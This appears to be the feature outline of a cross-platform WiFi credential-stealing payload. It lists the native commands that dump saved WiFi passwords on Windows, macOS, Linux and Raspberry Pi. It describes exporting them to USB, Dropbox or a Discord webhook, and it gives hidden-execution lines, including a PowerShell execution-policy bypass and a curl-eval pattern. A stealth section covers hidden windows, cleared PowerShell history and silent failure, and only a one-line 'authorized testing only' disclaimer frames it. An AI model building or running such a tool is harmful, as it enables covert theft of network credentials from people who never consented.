STAGE_1_DETECTION: Auto-detect OS and target configuration

STAGE_2_VAULT_INIT: Check protection file, initialize timestamp vault

STAGE_3_WIFI_EXTRACT: Extract WiFi credentials using native OS tools
  - Windows: netsh wlan show profiles + security
  - macOS: security find-internet-password
  - Linux: nmcli device wifi list + wpa_cli
  - RPi: iw dev + /etc/wpa_supplicant/

STAGE_4_MULTI_EXPORT: Export to configured locations
  - USB Drive (auto-detected per platform)
  - Dropbox API (if enabled in config)
  - Discord Webhook (if enabled in config)
  - Custom Location (if enabled in config)

FEATURES:
  ✓ Binary configuration (6 feature flags)
  ✓ Timestamped vault files (YYYYMMDD_HHMMSS format)
  ✓ Protection mode (check for file before executing)
  ✓ Auto-create vault (if file doesn't exist)
  ✓ Cross-platform support (Windows, macOS, Linux, RPi)
  ✓ Hidden execution (no visible windows)
  ✓ No temporary files (direct to target location)
  ✓ PowerShell history cleanup
  ✓ Error suppression (silent failures)
  ✓ Hostname + Username identification

CONFIG_BITS:
  Bit 0: Save to USB (1=on, 0=off)
  Bit 1: Save to Dropbox (1=on, 0=off)
  Bit 2: Save to Discord (1=on, 0=off)
  Bit 3: Save to Custom Location (1=on, 0=off)
  Bit 4: Protection Mode (1=on, 0=off)
  Bit 5: Auto-Create Vault (1=on, 0=off)

EXECUTION:
  Windows:   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass
  macOS:     /bin/bash -c 'eval "$(curl -s ...)'
  Linux:     bash -c 'export PATH=/usr/local/sbin:$PATH; ...'
  RPi:       Same as Linux (headless compatible)

STEALTHINESS:
  • No UAC prompts
  • No console windows
  • No registry modifications
  • No scheduled tasks created
  • No processes visible in Task Manager
  • History cleared after execution
  • Exits silently when complete

LEGAL: See DISCLAIMER.txt - Authorized testing only
